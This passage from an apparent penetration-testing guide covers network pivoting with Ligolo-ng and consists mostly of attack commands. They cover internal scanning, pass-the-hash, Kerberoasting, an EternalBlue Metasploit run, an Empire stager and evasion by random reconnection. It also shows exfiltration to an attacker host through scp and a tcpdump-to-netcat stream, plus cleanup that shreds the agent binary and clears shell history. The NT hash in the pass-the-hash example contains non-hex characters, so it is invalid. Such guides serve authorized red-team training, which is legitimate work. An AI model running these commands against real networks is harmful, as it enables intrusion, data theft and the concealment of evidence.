## Network Reconnaissance Through Ligolo-ng

After establishing your tunnels, comprehensive network reconnaissance is essential for successful penetration testing through pivoted networks.

### Automated Network Discovery

Use the built-in network discovery capabilities:

```
ligolo-ng (192.168.1.5) » scan 10.10.10.0/24
```

For more detailed scanning:

```bash
# Through direct routing
sudo nmap -sS -sV -p- --min-rate 5000 10.10.10.50

# Through SOCKS proxy
proxychains nmap -sT -sV -p 1-10000 10.10.10.50
```

### Service Enumeration Through Tunnels

#### Web Application Scanning

```bash
# Direct access
nikto -h 10.10.10.50

# Through SOCKS proxy
proxychains nikto -h 10.10.10.50

# Using Burp Suite with SOCKS proxy configuration
# Configure Burp to use SOCKS proxy at 127.0.0.1:1080
```

#### SMB Enumeration

```bash
# List SMB shares
smbclient -L //10.10.10.50/ -U username

# Mount SMB share locally
mount -t cifs -o username=user,password=pass //10.10.10.50/share /mnt/share
```

### Custom Network Mapping Script

Create a bash script to automate mapping discovered networks:

```bash
#!/bin/bash
# network_mapper.sh

TARGET_SUBNET=$1
OUTPUT_FILE="network_map_$(date +%Y%m%d_%H%M%S).txt"

echo "Mapping network: $TARGET_SUBNET" | tee $OUTPUT_FILE
echo "----------------------------------------" | tee -a $OUTPUT_FILE

# Quick host discovery
echo "Discovering live hosts..." | tee -a $OUTPUT_FILE
nmap -sn $TARGET_SUBNET -oG - | grep "Up" | tee -a $OUTPUT_FILE

# Extract IPs of live hosts
LIVE_HOSTS=$(nmap -sn $TARGET_SUBNET -oG - | grep "Up" | cut -d " " -f 2)

# Scan each live host
for HOST in $LIVE_HOSTS; do
    echo "----------------------------------------" | tee -a $OUTPUT_FILE
    echo "Scanning $HOST..." | tee -a $OUTPUT_FILE
    nmap -sV -F --script=banner $HOST | tee -a $OUTPUT_FILE
done

echo "Network mapping completed. Results saved to $OUTPUT_FILE"
```

## Lateral Movement Techniques

Ligolo-ng's transparent network access facilitates various lateral movement techniques.

### Pass-the-Hash with Ligolo-ng

```bash
# Using impacket through the tunnel
proxychains python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6g7h8i9j0 administrator@10.10.10.50
```

### RDP Access to Internal Systems

```bash
# Set up port forwarding to RDP
ligolo-ng (192.168.1.5) » listener_add --addr 0.0.0.0:13389 --to 10.10.10.50:3389 --name rdp_target

# Connect using xfreerdp
xfreerdp /v:localhost:13389 /u:administrator /p:password /d:domain
```

### SSH Jumping Through Multiple Networks

```bash
# Configure SSH config for proxying
cat >> ~/.ssh/config << EOF
Host internal-jump
    HostName 10.10.10.50
    User username
    ProxyCommand nc -X 5 -x localhost:1080 %h %p

Host final-target
    HostName 172.16.5.60
    User username
    ProxyJump internal-jump
EOF

# Connect to final target
ssh final-target
```

## Advanced Evasion Techniques

### Traffic Obfuscation

Ligolo-ng communications can be obfuscated to evade detection:

```bash
# On compromised host, use non-standard port
./agent -connect attacker_ip:443 -ignore-cert
```

### Limiting Network Fingerprint

Configure specific routes instead of routing entire subnets to minimize visibility:

```bash
# Instead of routing the whole subnet
# sudo ip route add 10.10.10.0/24 dev ligolo

# Only route specific hosts
sudo ip route add 10.10.10.50/32 dev ligolo
sudo ip route add 10.10.10.51/32 dev ligolo
```

### Periodic Reconnection Strategy

To avoid long-lived connections that might trigger alerts:

```bash
#!/bin/bash
# reconnection_script.sh

while true; do
    ./agent -connect attacker_ip:11601 -ignore-cert
    sleep $((RANDOM % 300 + 300))  # Random sleep between 5-10 minutes
done
```

## Attacking Domain Infrastructure

### Domain Enumeration Through Tunnel

```bash
# BloodHound collection through SOCKS proxy
proxychains python3 bloodhound.py -d domain.local -u username -p password -c All

# Using ldapdomaindump
proxychains ldapdomaindump -u 'DOMAIN\\username' -p 'password' 10.10.10.10
```

### Kerberoasting Through Pivots

```bash
# Request service tickets
proxychains python3 GetUserSPNs.py domain.local/username:password -request

# Crack obtained tickets
john --wordlist=wordlist.txt hashes.txt
```

## Securing Ligolo-ng Communications

### Using Custom Certificates

Instead of self-signed certificates, generate proper ones:

```bash
# Generate CA key and certificate
openssl genrsa -out ca.key 4096
openssl req -new -x509 -key ca.key -out ca.crt

# Generate server key and CSR
openssl genrsa -out server.key 4096
openssl req -new -key server.key -out server.csr

# Sign the CSR with the CA
openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt

# Start proxy with custom certificate
./proxy -cert server.crt -key server.key -laddr 0.0.0.0:11601
```

### Implementing Access Controls

Restrict IP addresses that can connect to your proxy:

```bash
# Using iptables to limit connections
sudo iptables -A INPUT -p tcp -s compromised_host_ip --dport 11601 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 11601 -j DROP
```

## Exfiltrating Data Through Ligolo-ng

### Encrypted File Transfer

```bash
# Create encrypted archive
tar -czvf - /path/to/sensitive/data | openssl enc -aes-256-cbc -out data.tar.gz.enc

# Transfer through tunnel
scp data.tar.gz.enc user@attacker_ip:/path/on/attacker/

# Decrypt on attacker machine
openssl enc -aes-256-cbc -d -in data.tar.gz.enc | tar -xzv
```

### Stream Exfiltration

For continuous data streaming:

```bash
# On target machine
tcpdump -i eth0 -w - | gzip -c | nc attacker_ip 9001

# On attacker machine
nc -lvp 9001 | gunzip -c > captured_traffic.pcap
```

## Post-Exploitation Cleanup

### Removing Agent Traces

```bash
# Remove agent binary
shred -u agent

# Clear bash history
history -c
rm ~/.bash_history

# Remove service if installed
systemctl stop ligolo-agent
systemctl disable ligolo-agent
rm /etc/systemd/system/ligolo-agent.service
systemctl daemon-reload
```

### Network Evidence Cleanup

```bash
# Check for established connections
netstat -tupn | grep ESTABLISHED

# Kill any remaining connections
fuser -k 11601/tcp
```

## Integration with Other Tools

### Metasploit Integration

```bash
# In Metasploit console
msf > setg Proxies socks5:127.0.0.1:1080
msf > use exploit/windows/smb/ms17_010_eternalblue
msf > set RHOSTS 10.10.10.40
msf > run
```

### Empire Integration

```bash
# In Empire
(Empire) > set proxychains True
(Empire) > usestager windows/launcher_bat
(Empire) > set Listener http
(Empire) > set OutFile /tmp/launcher.bat
(Empire) > generate
```

## Real-world Scenarios

### Case Study 1: Corporate Network Pivot

Scenario: Initial access to a DMZ server (192.168.1.5) with the goal of accessing the internal corporate network (10.0.0.0/8).

```bash
# Setup on attacker machine
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# On compromised DMZ server
./agent -connect attacker_ip:11601 -ignore-cert

# In Ligolo-ng console
ligolo-ng » session 0
ligolo-ng (192.168.1.5) » ifconfig
ligolo-ng (192.168.1.5) » start
ligolo-ng (192.168.1.5) » socks5 127.0.0.1:1080

# On attacker machine
sudo ip route add 10.0.0.0/8 dev ligolo

# Discovery
proxychains nmap -sT -p 80,443,445,3389 10.0.1.0/24

# Access sensitive data server
proxychains smbclient -U administrator //10.0.1.50/Finance/ 'P@ssw0rd!'
```

### Case Study 2: Segmented Production Environment

Scenario: Access to a jump server (10.10.10.5) that connects to production networks (172.16.0.0/16) with database servers.

```bash
# First pivot setup (as described earlier)
# After accessing the jump server:

# On jump server
./agent -connect attacker_ip:11601 -ignore-cert

# In Ligolo-ng console
ligolo-ng (10.10.10.5) » start
ligolo-ng (10.10.10.5) » listener_add --addr 0.0.0.0:1521 --to 172.16.1.10:1521 --name oracle_prod

# On attacker machine
sudo ip route add 172.16.0.0/16 dev ligolo

# Access production database
sqlplus user/password@localhost:1521/PROD
```

## Performance Optimization

### Tuning Network Parameters

For better performance on large file transfers:

```bash
# Increase MTU for better throughput
sudo ip link set ligolo mtu 1500

# On Linux systems, optimize TCP parameters
sudo sysctl -w net.ipv4.tcp_window_scaling=1
sudo sysctl -w net.core.rmem_max=16777216
sudo sysctl -w net.core.wmem_max=16777216
```

### Optimizing for Different Network Conditions

For high-latency networks:

```bash
# Adjust agent connection parameters
./agent -connect attacker_ip:11601 -ignore-cert -retry 5 -retry-interval 10
```

## Legal and Ethical Considerations

When using Ligolo-ng for penetration testing, always ensure:

1. You have explicit written permission to test the target networks
2. Your scope clearly defines which network segments you can access
3. Your client is aware of pivoting techniques being used
4. Activities comply with relevant laws and regulations
5. Data accessed through pivots is handled according to agreed confidentiality terms

Document all pivoting activities for your report, including:
- Network segments discovered and accessed
- Methods used to establish tunnels
- Sensitive systems accessed through pivots
- Recommendations for network segmentation improvements

## Conclusion

Ligolo-ng provides penetration testers with powerful capabilities for network pivoting and access to segmented networks. By mastering these techniques, you can effectively evaluate your client's network security posture, identify weaknesses in network segmentation, and demonstrate the potential impact of initial compromise.

Remember that the tool's transparent network access requires responsible use and careful documentation of all testing activities. Always operate within scope and with proper authorization.

## Additional Resources

- [Ligolo-ng GitHub Repository](https://github.com/nicocha30/ligolo-ng)
- [Ligolo-ng Documentation](https://github.com/nicocha30/ligolo-ng/blob/master/README.md)
- [Layer 3 Pivoting Techniques](https://pentest.blog/explore-hidden-networks-with-double-pivoting/)
- [Network Pivoting and Post-Exploitation Techniques](https://www.sans.org/reading-room/whitepapers/testing/paper/36117)
